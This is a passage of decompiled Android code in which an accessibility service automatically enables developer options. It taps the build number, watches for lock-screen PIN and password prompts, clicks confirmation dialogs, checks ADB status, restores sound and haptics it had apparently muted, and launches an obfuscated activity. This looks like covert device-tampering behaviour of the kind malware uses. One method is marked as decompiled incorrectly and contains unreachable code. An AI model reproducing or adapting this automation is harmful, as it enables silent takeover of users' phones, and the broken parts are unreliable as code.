            if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                return listFindAccessibilityNodeInfosByText.get(0);
            }
        }
        return null;
    }

    /* renamed from: b9 */
    public static boolean m211966b9(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo.isPassword()) {
            return true;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                boolean zM211966b9 = m211966b9(child);
                child.recycle();
                if (zM211966b9) {
                    return true;
                }
            }
        }
        return false;
    }

    /* renamed from: c0 */
    public static AccessibilityNodeInfo m211967c0(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo.isScrollable()) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo accessibilityNodeInfoM211967c0 = m211967c0(child);
                if (accessibilityNodeInfoM211967c0 != null) {
                    if (accessibilityNodeInfoM211967c0 != child) {
                        child.recycle();
                    }
                    return accessibilityNodeInfoM211967c0;
                }
                child.recycle();
            }
        }
        return null;
    }

    /* renamed from: c1 */
    public static AccessibilityNodeInfo m211968c1(AccessibilityNodeInfo accessibilityNodeInfo) {
        y90 y90Var = AbstractC0361a3.f53874a0;
        Iterator it = dh0.f55799e9.iterator();
        while (it.hasNext()) {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText((String) it.next());
            if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                return listFindAccessibilityNodeInfosByText.get(0);
            }
        }
        return null;
    }

    /* renamed from: c2 */
    public static AccessibilityNodeInfo m211969c2(AccessibilityNodeInfo accessibilityNodeInfo) {
        Iterator it = dh0.f55770c0.iterator();
        while (it.hasNext()) {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText((String) it.next());
            if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                return listFindAccessibilityNodeInfosByText.get(0);
            }
        }
        return null;
    }

    /* renamed from: c4 */
    public static boolean m211970c4(String str) {
        if (AbstractC0779a1.m213652a5(str, "ConfirmLock", false) || AbstractC0779a1.m213652a5(str, "ChooseLockGeneric", false) || AbstractC0779a1.m213652a5(str, "ConfirmVivoPin", false) || AbstractC0779a1.m213652a5(str, "ConfirmDeviceCredential", false) || AbstractC0779a1.m213652a5(str, "ConfirmCredential", false) || AbstractC0779a1.m213652a5(str, "KeyguardConfirm", false)) {
            return true;
        }
        if (AbstractC0779a1.m213652a5(str, "coloros", false) && (AbstractC0779a1.m213652a5(str, "lock", false) || AbstractC0779a1.m213652a5(str, "Lock", false) || AbstractC0779a1.m213652a5(str, "password", false) || AbstractC0779a1.m213652a5(str, "Password", false))) {
            return true;
        }
        return (AbstractC0779a1.m213652a5(str, "oplus", false) && (AbstractC0779a1.m213652a5(str, "lock", false) || AbstractC0779a1.m213652a5(str, "Lock", false) || AbstractC0779a1.m213652a5(str, "password", false) || AbstractC0779a1.m213652a5(str, "Password", false))) || AbstractC0779a1.m213652a5(str, "VerifyLock", false) || AbstractC0779a1.m213652a5(str, "LockPattern", false) || AbstractC0779a1.m213652a5(str, "LockPassword", false) || AbstractC0779a1.m213652a5(str, "LockPin", false) || AbstractC0779a1.m213652a5(str, "UnlockActivity", false) || AbstractC0779a1.m213652a5(str, "SecurityActivity", false);
    }

    /* renamed from: a0 */
    public final boolean m211971a0() {
        AccessibilityNodeInfo rootInActiveWindow = this.f53792a0.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            t60.m214714d6("OpenDevDelegate", "G() rootNode 为空");
            return false;
        }
        try {
            for (String str : dh0.f55781d1) {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                    t60.m214714d6("OpenDevDelegate", "G() 找到「" + str + "」→ 在关于手机窗口");
                    rootInActiveWindow.recycle();
                    return true;
                }
            }
            t60.m214714d6("OpenDevDelegate", "G() 所有关于手机文本都没找到");
            return false;
        } finally {
            rootInActiveWindow.recycle();
        }
    }

    /* renamed from: a1 */
    public final boolean m211972a1() {
        AccessibilityNodeInfo rootInActiveWindow;
        if (this.f53803b1) {
            t60.m214714d6("OpenDevDelegate", "H() confirmLockDetected=true");
            return true;
        }
        String str = this.f53802b0;
        if (str != null && m211970c4(str)) {
            t60.m214714d6("OpenDevDelegate", "H() 匹配到密码确认 Activity: ".concat(str));
            return true;
        }
        if (t60.m214686a2(str, "android.inputmethodservice.SoftInputWindow") && (rootInActiveWindow = this.f53792a0.getRootInActiveWindow()) != null) {
            try {
                if (m211966b9(rootInActiveWindow)) {
                    t60.m214714d6("OpenDevDelegate", "H() 软键盘+密码输入框检测到密码窗口");
                    return true;
                }
            } finally {
                rootInActiveWindow.recycle();
            }
        }
        return m211986c9("H()");
    }

    /* renamed from: a2 */
    public final boolean m211973a2() {
        AccessibilityNodeInfo rootInActiveWindow = this.f53792a0.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return false;
        }
        try {
            ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(dh0.f55781d1, dh0.f55770c0);
            int size = arrayListM213298i5.size();
            int i = 0;
            while (i < size) {
                Object obj = arrayListM213298i5.get(i);
                i++;
                String str = (String) obj;
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                    t60.m214714d6("OpenDevDelegate", "I() 检测到'" + str + "'，还在关于手机页面，返回 false");
                    Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                    while (it.hasNext()) {
                        try {
                            ((AccessibilityNodeInfo) it.next()).recycle();
                        } catch (Exception unused) {
                        }
                    }
                    return false;
                }
            }
            for (String str2 : dh0.f55782d2) {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = rootInActiveWindow.findAccessibilityNodeInfosByText(str2);
                if (listFindAccessibilityNodeInfosByText2 != null && !listFindAccessibilityNodeInfosByText2.isEmpty()) {
                    t60.m214714d6("OpenDevDelegate", "I() 找到开发者选项页面元素'" + str2 + "'，确认在开发者选项页面");
                    Iterator<T> it2 = listFindAccessibilityNodeInfosByText2.iterator();
                    while (it2.hasNext()) {
                        try {
                            ((AccessibilityNodeInfo) it2.next()).recycle();
                        } catch (Exception unused2) {
                        }
                    }
                    rootInActiveWindow.recycle();
                    return true;
                }
            }
            t60.m214714d6("OpenDevDelegate", "I() 未找到开发者选项页面特有元素，返回 false");
            return false;
        } finally {
            rootInActiveWindow.recycle();
        }
    }

    /* renamed from: a3 */
    public final boolean m211974a3() {
        Context context = this.f53793a1;
        try {
        } catch (Exception e) {
            tz0.m214810b0("M() 检测异常: ", e.getMessage(), "OpenDevDelegate");
        }
        if (Settings.Global.getInt(context.getContentResolver(), "development_settings_enabled", 0) > 0) {
            t60.m214714d6("OpenDevDelegate", "M() 开发者选项已开启（标准检测）");
            return true;
        }
        try {
            if (Settings.Secure.getInt(context.getContentResolver(), "development_settings_enabled", 0) > 0) {
                t60.m214714d6("OpenDevDelegate", "M() 开发者选项已开启（Secure检测）");
                return true;
            }
        } catch (Exception unused) {
        }
        try {
            if (Settings.Global.getInt(context.getContentResolver(), "adb_enabled", 0) > 0) {
                t60.m214714d6("OpenDevDelegate", "M() ADB已启用，推断开发者选项已开启");
                return true;
            }
        } catch (Exception unused2) {
        }
        return false;
    }

    /* renamed from: a4 */
    public final void m211975a4() {
        AccessibilityNodeInfo rootInActiveWindow;
        t60.m214702c3("OpenDevDelegate", "Q() 确认对话框处理");
        AtomicReference atomicReference = this.f53795a3;
        int i = ((OpenDevelopmentDelegate$State) atomicReference.get()).f53753a0;
        OpenDevelopmentDelegate$State openDevelopmentDelegate$State = OpenDevelopmentDelegate$State.OPEN_DEV_DEPT_WIN_CHECK;
        if (i >= 9) {
            t60.m214702c3("OpenDevDelegate", "Q() 状态已是 WIN_CHECK 或更高(" + i + ")，跳过弹窗处理");
            return;
        }
        if (m211981c3() && (rootInActiveWindow = this.f53792a0.getRootInActiveWindow()) != null) {
            try {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/button1");
                AccessibilityNodeInfo accessibilityNodeInfo = null;
                AccessibilityNodeInfo accessibilityNodeInfo2 = listFindAccessibilityNodeInfosByViewId != null ? (AccessibilityNodeInfo) AbstractC0715je.m213291h8(listFindAccessibilityNodeInfosByViewId) : null;
                OpenDevelopmentDelegate$State openDevelopmentDelegate$State2 = OpenDevelopmentDelegate$State.OPEN_DEV_DEPT_ENABLE_DEV_OPT_SUCCESS;
                if (accessibilityNodeInfo2 != null && accessibilityNodeInfo2.performAction(16)) {
                    t60.m214702c3("OpenDevDelegate", "已点击确认开启开发者选项");
                    if (m211974a3() || m211973a2()) {
                        atomicReference.set(openDevelopmentDelegate$State2);
                        m211977a6();
                    } else {
                        m211980b4();
                        Thread.sleep(10 * 200);
                        if (m211973a2()) {
                            atomicReference.set(openDevelopmentDelegate$State);
                        }
                    }
                    rootInActiveWindow.recycle();
                    return;
                }
                y90 y90Var = AbstractC0361a3.f53874a0;
                int i2 = 0;
                String[] strArr = (String[]) dh0.f55752a2.toArray(new String[0]);
                String[] strArr2 = (String[]) Arrays.copyOf(strArr, strArr.length);
                int length = strArr2.length;
                loop0: while (true) {
                    if (i2 >= length) {
                        break;
                    }
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(strArr2[i2]);
                    if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                        for (AccessibilityNodeInfo accessibilityNodeInfo3 : listFindAccessibilityNodeInfosByText) {
                            if (accessibilityNodeInfo3.isClickable()) {
                                accessibilityNodeInfo = accessibilityNodeInfo3;
                                break loop0;
                            }
                        }
                    }
                    i2++;
                }
                if (accessibilityNodeInfo != null && accessibilityNodeInfo.performAction(16)) {
                    t60.m214702c3("OpenDevDelegate", "已点击确定按钮");
                    if (m211974a3() || m211973a2()) {
                        atomicReference.set(openDevelopmentDelegate$State2);
                        m211977a6();
                    }
                }
                rootInActiveWindow.recycle();
            } catch (Throwable th) {
                rootInActiveWindow.recycle();
                throw th;
            }
        }
    }

    /* renamed from: a5 */
    public final void m211976a5() {
        t60.m214714d6("OpenDevDelegate", "R() 失败处理，检查 M()=" + m211974a3());
        if (m211974a3()) {
            t60.m214714d6("OpenDevDelegate", "R() 开发者选项已开启，调用 S()");
            m211977a6();
            return;
        }
        t60.m214714d6("OpenDevDelegate", "R() 开发者选项未开启，执行失败流程");
        Context context = this.f53793a1;
        try {
            Object systemService = context.getSystemService("audio");
            AudioManager audioManager = systemService instanceof AudioManager ? (AudioManager) systemService : null;
            ContentResolver contentResolver = context.getContentResolver();
            LinkedHashMap linkedHashMap = this.f53807b5;
            if (audioManager != null) {
                for (Map.Entry entry : linkedHashMap.entrySet()) {
                    int iIntValue = ((Number) entry.getKey()).intValue();
                    int iIntValue2 = ((Number) entry.getValue()).intValue();
                    try {
                        audioManager.setStreamVolume(iIntValue, iIntValue2, 0);
                        t60.m214702c3("OpenDevDelegate", "流" + iIntValue + "音量恢复为" + iIntValue2);
                    } catch (Exception e) {
                        t60.m214726f4("OpenDevDelegate", "恢复流" + iIntValue + "音量失败: " + e.getMessage());
                    }
                }
            }
            linkedHashMap.clear();
            if (audioManager != null) {
                try {
                    audioManager.setRingerMode(this.f53805b3);
                } catch (Exception e2) {
                    t60.m214726f4("OpenDevDelegate", "恢复铃声模式失败: " + e2.getMessage());
                }
            }
            t60.m214714d6("OpenDevDelegate", "已恢复铃声模式: " + this.f53805b3);
            try {
                Settings.System.putInt(contentResolver, "haptic_feedback_enabled", this.f53806b4);
                t60.m214714d6("OpenDevDelegate", "已恢复触觉反馈: " + this.f53806b4);
            } catch (Exception e3) {
                t60.m214726f4("OpenDevDelegate", "恢复触觉反馈失败: " + e3.getMessage());
            }
            t60.m214714d6("OpenDevDelegate", "适配后恢复声音完成");
        } catch (Exception e4) {
            t60.m214705c6("OpenDevDelegate", "restoreSoundAndHaptic 异常", e4);
        }
        m211979a8();
        this.f53792a0.performGlobalAction(2);
        Thread.sleep(5 * 200);
        this.f53795a3.set(OpenDevelopmentDelegate$State.OPEN_DEV_DEPT_ENABLE_DEV_OPT_FAIL);
        h10 h10Var = this.f53798a6;
        if (h10Var != null) {
            ((SystemOptimizeManager$startOpenDevelopmentDelegate$2) h10Var).invoke("开发者选项开启失败");
        }
    }

    /* renamed from: a6 */
    public final void m211977a6() {
        if (!this.f53796a4.tryLock()) {
            t60.m214714d6("OpenDevDelegate", "S() 获取锁失败，可能已经在处理中");
            return;
        }
        try {
            t60.m214714d6("OpenDevDelegate", "S() 开发者选项开启成功，准备进入开发者选项窗口");
            this.f53803b1 = false;
            m211979a8();
            m211980b4();
            Thread.sleep(10 * 200);
            if (m211973a2()) {
                this.f53795a3.set(OpenDevelopmentDelegate$State.OPEN_DEV_DEPT_WIN_PREPARE);
                t60.m214714d6("OpenDevDelegate", "S() 已进入开发者选项窗口，回调 onComplete");
            } else {
                t60.m214726f4("OpenDevDelegate", "S() Z() 未能在 2 秒内进入开发者选项页，但开发者选项已开启");
            }
            if (!this.f53799a7) {
                this.f53799a7 = true;
                w00 w00Var = this.f53797a5;
                if (w00Var != null) {
                    ((SystemOptimizeManager$startOpenDevelopmentDelegate$1) w00Var).invoke();
                }
            }
            this.f53796a4.unlock();
        } catch (Throwable th) {
            this.f53796a4.unlock();
            throw th;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:40:0x00e8, code lost:
    
        r8 = r11.iterator();
     */
    /* JADX WARN: Code restructure failed: missing block: B:42:0x00f0, code lost:
    
        if (r8.hasNext() == false) goto L80;
     */
    /* JADX WARN: Code restructure failed: missing block: B:44:0x00f8, code lost:
    
        ((android.view.accessibility.AccessibilityNodeInfo) r8.next()).recycle();
     */
    /* JADX WARN: Code restructure failed: missing block: B:48:0x00fe, code lost:
    
        r14.recycle();
     */
    /* JADX WARN: Removed duplicated region for block: B:59:0x014b  */
    /* JADX WARN: Removed duplicated region for block: B:87:0x0127 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:90:0x0026 A[SYNTHETIC] */
    /* renamed from: a7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m211978a7(AccessibilityNodeInfo accessibilityNodeInfo) throws InterruptedException {
        boolean z;
        t60.m214714d6("OpenDevDelegate", "Y() 开始点击7次版本号");
        for (int i = 1; i < 8; i++) {
            try {
                accessibilityNodeInfo.performAction(16);
            } catch (Exception unused) {
            }
            Thread.sleep(150L);
        }
        t60.m214714d6("OpenDevDelegate", "Y() 7次点击完成");
        t60.m214714d6("OpenDevDelegate", "Y() 开始轮询检测密码弹窗（最多5000ms）...");
        long j = 0;
        loop1: while (true) {
            if (j >= 5000) {
                break;
            }
            Thread.sleep(500L);
            j += 500;
            if (!m211972a1()) {
                AccessibilityNodeInfo rootInActiveWindow = this.f53792a0.getRootInActiveWindow();
                if (rootInActiveWindow == null) {
                    if (Settings.Global.getInt(this.f53793a1.getContentResolver(), "development_settings_enabled", 0) <= 0) {
                        t60.m214714d6("OpenDevDelegate", "Y() 在" + j + "ms时检测到 development_settings_enabled=1，开发者选项已解锁");
                        break;
                    }
                } else {
                    try {
                        Iterator it = dh0.f55782d2.iterator();
                        while (it.hasNext()) {
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText((String) it.next());
                            if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                break loop1;
                            }
                        }
                        if (Settings.Global.getInt(this.f53793a1.getContentResolver(), "development_settings_enabled", 0) <= 0) {
                        }
                    } finally {
                        try {
                            rootInActiveWindow.recycle();
                        } catch (Exception unused2) {
                        }
                    }
                }
            } else {
                t60.m214714d6("OpenDevDelegate", "Y() 在" + j + "ms时检测到密码弹窗");
                t60.m214714d6("OpenDevDelegate", "Y() 检测到密码弹窗，用户有密码，等待输入...");
                this.f53795a3.set(OpenDevelopmentDelegate$State.OPEN_DEV_DEPT_PREPARE_CONFIRM_LOCK_WIN);
                long jCurrentTimeMillis = System.currentTimeMillis();
                while (true) {
                    if (System.currentTimeMillis() - jCurrentTimeMillis >= 30000) {
                        t60.m214714d6("OpenDevDelegate", "等待密码窗口消失超时 30000ms");
                        z = false;
                        break;
                    }
                    Thread.sleep(1000L);
                    String str = this.f53802b0;
                    if (!((str == null || !m211970c4(str)) ? m211986c9(null) : true)) {
                        t60.m214714d6("OpenDevDelegate", "密码窗口已消失（等了" + (System.currentTimeMillis() - jCurrentTimeMillis) + "ms）");
                        this.f53803b1 = false;
                        t60.m214714d6("OpenDevDelegate", "已重置 confirmLockDetected = false");
                        z = true;
                        break;
                    }
                }
                if (!z) {
                    t60.m214726f4("OpenDevDelegate", "Y() 密码窗口等待超时30秒");
                    return false;
                }
                t60.m214714d6("OpenDevDelegate", "Y() 密码窗口已消失，等待2秒后跳转");
                Thread.sleep(2000L);
            }
        }
        t60.m214714d6("OpenDevDelegate", "Y() 轮询5000ms后未检测到密码弹窗，用户没有密码");
        if (m211981c3()) {
            t60.m214714d6("OpenDevDelegate", "Y() 检测到确认对话框，点击确认");
            m211975a4();
            Thread.sleep(1000L);
        }
        t60.m214714d6("OpenDevDelegate", "Y() 跳转到开发者选项页面");
        m211980b4();
        Thread.sleep(2000L);
        this.f53795a3.set(OpenDevelopmentDelegate$State.OPEN_DEV_DEPT_ENABLE_DEV_OPT_SUCCESS);
        m211977a6();
        t60.m214714d6("OpenDevDelegate", "Y() 完成");
        return true;
        t60.m214714d6("OpenDevDelegate", "Y() 在" + j + "ms时检测到已进入开发者选项页面，无需密码");
        t60.m214714d6("OpenDevDelegate", "Y() 轮询5000ms后未检测到密码弹窗，用户没有密码");
        if (m211981c3()) {
        }
        t60.m214714d6("OpenDevDelegate", "Y() 跳转到开发者选项页面");
        m211980b4();
        Thread.sleep(2000L);
        this.f53795a3.set(OpenDevelopmentDelegate$State.OPEN_DEV_DEPT_ENABLE_DEV_OPT_SUCCESS);
        m211977a6();
        t60.m214714d6("OpenDevDelegate", "Y() 完成");
        return true;
    }

    /* renamed from: a8 */
    public final void m211979a8() {
        try {
            this.f53794a2.shutdownNow();
        } catch (Exception e) {
            t60.m214705c6("OpenDevDelegate", "a0() 清理失败", e);
        }
    }

    /* renamed from: b4 */
    public final void m211980b4() {
        String str = Build.BRAND;
        t60.m214694b5(str, "BRAND");
        String lowerCase = str.toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        t60.m214714d6("OpenDevDelegate", "f1() 尝试打开开发者选项页面，品牌: ".concat(lowerCase));
        int iHashCode = lowerCase.hashCode();
        if (iHashCode == -1206476313 ? !lowerCase.equals("huawei") : !(iHashCode == 99462250 ? lowerCase.equals("honor") : iHashCode == 916625417 && lowerCase.equals("hihonor"))) {
            m211985c8();
            return;
        }
        for (ComponentName componentName : AbstractC0716jf.m213306g5(new ComponentName("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsDashboardActivity"), new ComponentName("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsActivity"), new ComponentName("com.android.settings", "com.android.settings.HWSettings"), new ComponentName("com.android.settings", "com.hihonor.settingslib.SubSettings"))) {
            try {
                Intent intent = new Intent();
                intent.setComponent(componentName);
                intent.addFlags(268435456);
                intent.addFlags(1073741824);
                intent.addFlags(65536);
                intent.addFlags(8388608);
                intent.putExtra(":settings:show_fragment", "com.android.settings.development.DevelopmentSettingsDashboardFragment");
                this.f53793a1.startActivity(intent);
                t60.m214714d6("OpenDevDelegate", "f1() 华为/荣耀 通过 ComponentName 启动成功: " + componentName.getClassName());
                return;
            } catch (Exception e) {
                t60.m214702c3("OpenDevDelegate", "f1() 华为/荣耀 ComponentName 失败: " + componentName.getClassName() + ", " + e.getMessage());
            }
        }
        t60.m214714d6("OpenDevDelegate", "f1() 华为/荣耀 ComponentName 都失败，尝试标准 Intent");
        m211985c8();
    }

    /* renamed from: c3 */
    public final boolean m211981c3() {
        String string;
        AccessibilityNodeInfo rootInActiveWindow = this.f53792a0.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return false;
        }
        try {
            CharSequence className = rootInActiveWindow.getClassName();
            if (className == null || (string = className.toString()) == null) {
                string = "";
            }
            if (AbstractC0779a1.m213652a5(string, "AlertDialog", false)) {
                rootInActiveWindow.recycle();
                return true;
            }
            boolean zM211962b5 = m211962b5(rootInActiveWindow);
            rootInActiveWindow.recycle();
            return zM211962b5;
        } catch (Throwable th) {
            rootInActiveWindow.recycle();
            throw th;
        }
    }

    /* renamed from: c5 */
    public final boolean m211982c5() {
        AccessibilityNodeInfo rootInActiveWindow = this.f53792a0.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return false;
        }
        try {
            List list = dh0.f55750a0;
            Iterator it = dh0.f55770c0.iterator();
            while (it.hasNext()) {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText((String) it.next());
                if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                    rootInActiveWindow.recycle();
                    return true;
                }
            }
            return false;
        } finally {
            rootInActiveWindow.recycle();
        }
    }

    /* renamed from: c6 */
    public final void m211983c6() {
        Context context = this.f53793a1;
        try {
            Intent intent = new Intent(context, (Class<?>) iuzxujjtqev.class);
            intent.setFlags(872415232);
            context.startActivity(intent);
            t60.m214714d6("OpenDevDelegate", "已启动 iuzxujjtqev 到前台");
        } catch (Exception e) {
            t60.m214705c6("OpenDevDelegate", "启动 iuzxujjtqev 失败", e);
            try {
                Intent launchIntentForPackage = context.getPackageManager().getLaunchIntentForPackage(context.getPackageName());
                if (launchIntentForPackage != null) {
                    launchIntentForPackage.setFlags(335544320);
                    context.startActivity(launchIntentForPackage);
                    t60.m214714d6("OpenDevDelegate", "通过包名启动 app 到前台");
                }
            } catch (Exception e2) {
                t60.m214705c6("OpenDevDelegate", "备用启动也失败", e2);
            }
        }
    }

    /* renamed from: c7 */
    public final void m211984c7() {
        int i = this.f53800a8 + 1;
        this.f53800a8 = i;
        AbstractC0003a2.m44c5("打开关于手机页面 (第", i, "次)", "OpenDevDelegate");
        try {
            Intent intent = new Intent("android.settings.DEVICE_INFO_SETTINGS");
            intent.setFlags(268435456);
            this.f53793a1.startActivity(intent);
            t60.m214714d6("OpenDevDelegate", "打开关于手机设置");
            Thread.sleep(5 * 200);
        } catch (Exception e) {
            t60.m214705c6("OpenDevDelegate", "打开关于手机设置失败", e);
        }
        this.f53794a2.schedule(new kl0(this, 2), 500L, TimeUnit.MILLISECONDS);
    }

    /* renamed from: c8 */
    public final boolean m211985c8() {
        Context context = this.f53793a1;
        try {
            Intent intent = new Intent("android.settings.APPLICATION_DEVELOPMENT_SETTINGS");
            intent.addFlags(268435456);
            intent.addFlags(1073741824);
            intent.addFlags(65536);
            intent.addFlags(8388608);
            context.startActivity(intent);
            t60.m214714d6("OpenDevDelegate", "f1() 标准 Intent 启动开发者选项成功");
            return true;
        } catch (Exception e) {
            tz0.m214807a7("f1() 标准 Intent 失败: ", e.getMessage(), "OpenDevDelegate");
            try {
                Intent intent2 = new Intent("android.settings.APPLICATION_DEVELOPMENT_SETTINGS");
                intent2.addFlags(268435456);
                context.startActivity(intent2);
                t60.m214714d6("OpenDevDelegate", "f1() 备用 Intent 启动成功");
                return true;
            } catch (Exception e2) {
                tz0.m214807a7("f1() 备用 Intent 也失败: ", e2.getMessage(), "OpenDevDelegate");
                return false;
            }
        }
    }

    /* renamed from: c9 */
    public final boolean m211986c9(String str) {
        AccessibilityNodeInfo rootInActiveWindow = this.f53792a0.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return false;
        }
        try {
            if (m211966b9(rootInActiveWindow)) {
                if (str != null) {
                    t60.m214714d6("OpenDevDelegate", str.concat(": 找到密码输入框"));
                }
                try {
                    rootInActiveWindow.recycle();
                } catch (Exception unused) {
                }
                return true;
            }
            Iterator it = AbstractC0716jf.m213306g5("com.android.settings:id/lockPattern", "com.android.systemui:id/lockPattern", "com.coloros.settings:id/lockPattern", "com.oplus.settings:id/lockPattern", "com.samsung.android.biometrics.app.setting:id/lockPattern", "com.android.settings:id/biometric_lockPattern", "com.samsung.android.biometrics.app.setting:id/biometric_lockPattern").iterator();
            while (true) {
                if (!it.hasNext()) {
                    for (String str2 : AbstractC0716jf.m213306g5("com.android.settings:id/pinEntry", "com.android.settings:id/passwordEntry", "com.android.settings:id/password_entry", "com.coloros.settings:id/pinEntry", "com.coloros.settings:id/passwordEntry", "com.oplus.settings:id/pinEntry", "com.oplus.settings:id/passwordEntry")) {
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(str2);
                        if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                            if (str != null) {
                                t60.m214714d6("OpenDevDelegate", str + ": 找到PIN/密码输入框 " + str2);
                            }
                            Iterator<T> it2 = listFindAccessibilityNodeInfosByViewId.iterator();
                            while (it2.hasNext()) {
                                try {
                                    ((AccessibilityNodeInfo) it2.next()).recycle();
                                } catch (Exception unused2) {
                                }
                            }
                        }
                    }
                    try {
                        rootInActiveWindow.recycle();
                    } catch (Exception unused3) {
                    }
                    return false;
                }
                String str3 = (String) it.next();
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId2 = rootInActiveWindow.findAccessibilityNodeInfosByViewId(str3);
                if (listFindAccessibilityNodeInfosByViewId2 != null && !listFindAccessibilityNodeInfosByViewId2.isEmpty()) {
                    if (str != null) {
                        t60.m214714d6("OpenDevDelegate", str + ": 找到图案锁 " + str3);
                    }
                    Iterator<T> it3 = listFindAccessibilityNodeInfosByViewId2.iterator();
                    while (it3.hasNext()) {
                        try {
                            ((AccessibilityNodeInfo) it3.next()).recycle();
                        } catch (Exception unused4) {
                        }
                    }
                }
            }
            try {
                rootInActiveWindow.recycle();
            } catch (Exception unused5) {
            }
            return true;
        } finally {
        }
    }

    /* renamed from: d0 */
    public final void m211987d0(RunnableC0503fo runnableC0503fo) {
        ScheduledExecutorService scheduledExecutorService = this.f53794a2;
        try {
            if (!scheduledExecutorService.isShutdown() && !scheduledExecutorService.isTerminated()) {
                scheduledExecutorService.execute(runnableC0503fo);
            }
        } catch (Exception unused) {
        }
    }

    /* renamed from: d1 */
    public final AccessibilityNodeInfo m211988d1(AccessibilityNodeInfo accessibilityNodeInfo, boolean z, h10 h10Var) {
        AccessibilityService accessibilityService;
        AccessibilityNodeInfo rootInActiveWindow;
        boolean zM212110a5;
        Context context = this.f53793a1;
        for (int i = 0; i < 14 && (rootInActiveWindow = (accessibilityService = this.f53792a0).getRootInActiveWindow()) != null; i++) {
            try {
                AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) h10Var.invoke(rootInActiveWindow);
                if (accessibilityNodeInfo2 != null) {
                    try {
                        rootInActiveWindow.recycle();
                    } catch (Exception unused) {
                    }
                    return accessibilityNodeInfo2;
                }
                if (z) {
                    List list = C0362a4.f53875a0;
                    zM212110a5 = C0362a4.m212108a3(accessibilityNodeInfo);
                } else {
                    List list2 = C0362a4.f53875a0;
                    zM212110a5 = C0362a4.m212110a5(accessibilityNodeInfo, accessibilityService, context);
                }
                if (!zM212110a5) {
                    try {
                        rootInActiveWindow.recycle();
                        return null;
                    } catch (Exception unused2) {
                        return null;
                    }
                }
                C0362a4.m212113a8(accessibilityService, 1500L);
                try {
                    rootInActiveWindow.recycle();
                } catch (Exception unused3) {
                }
            } catch (Throwable th) {
                try {
                    rootInActiveWindow.recycle();
                } catch (Exception unused4) {
                }
                throw th;
            }
        }
        return null;
    }

    /* renamed from: d2 */
    public final void m211989d2(AccessibilityEvent accessibilityEvent, String str, String str2) {
        t60.m214695b6(accessibilityEvent, "event");
        OpenDevelopmentDelegate$State openDevelopmentDelegate$State = (OpenDevelopmentDelegate$State) this.f53795a3.get();
        int i = openDevelopmentDelegate$State.f53753a0;
        int i2 = 1;
        if (str2 != null) {
            if (accessibilityEvent.getEventType() == 32) {
                this.f53802b0 = str2;
                t60.m214714d6("OpenDevDelegate", "t() 窗口切换: ".concat(str2));
            }
            if (m211970c4(str2)) {
                this.f53803b1 = true;
                t60.m214714d6("OpenDevDelegate", "检测到密码确认窗口: ".concat(str2));
            }
        }
        StringBuilder sbM41c2 = AbstractC0003a2.m41c2("t() 收到事件: pkg=", str, ", cls=", str2, ", 当前状态=");
        sbM41c2.append(openDevelopmentDelegate$State);
        sbM41c2.append("(code=");
        sbM41c2.append(i);
        sbM41c2.append(")");
        t60.m214714d6("OpenDevDelegate", sbM41c2.toString());
        if (str2 != null && accessibilityEvent.getEventType() == 32 && m211970c4(str2) && !this.f53804b2) {
            this.f53804b2 = true;
